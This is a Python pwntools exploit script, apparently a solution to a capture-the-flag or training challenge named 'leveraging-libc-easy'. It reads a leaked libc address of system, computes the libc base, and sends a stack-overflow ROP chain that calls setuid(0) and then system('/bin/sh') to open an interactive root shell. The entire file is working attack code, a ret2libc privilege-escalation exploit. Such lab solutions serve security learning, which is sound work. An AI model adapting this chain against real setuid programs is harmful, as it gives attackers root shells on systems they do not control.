from pwn import *

libc_path = '/lib/x86_64-linux-gnu/libc-2.31.so'
exe = '/challenge/leveraging-libc-easy' #add hard in hard challenge

context.binary = exe
#context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(exe)
libc = ELF(libc_path)
p = process(exe)

p.recvuntil(b'is: ')
leak = p.recvline().decode().strip()
addr_str = leak.rstrip('.')
leaked_system = int(addr_str,16)
log.info(f"Leaked Addresss:{hex(leaked_system)}")

system_off = libc.symbols["system"]
libc_base = leaked_system - system_off
log.success(f"libc base (computed) = {hex(libc_base)}")
libc.address = libc_base

binsh_off = next(libc.search(b"/bin/sh\x00"))
binsh_addr = binsh_off
log.info(f'"/bin/sh" @ {hex(binsh_addr)} (if correct libc)')

rop = ROP([elf, libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

padding = b'A' * 64 #replace it with 96 for hard
padding += b'B' * 8

exit_pos = libc.symbols["exit"]
exit_addr = exit_pos 

setuid_addr = libc.symbols['setuid']


payload = padding
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid_addr)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(leaked_system)
payload += p64(exit_addr)

p.send(payload)
p.interactive()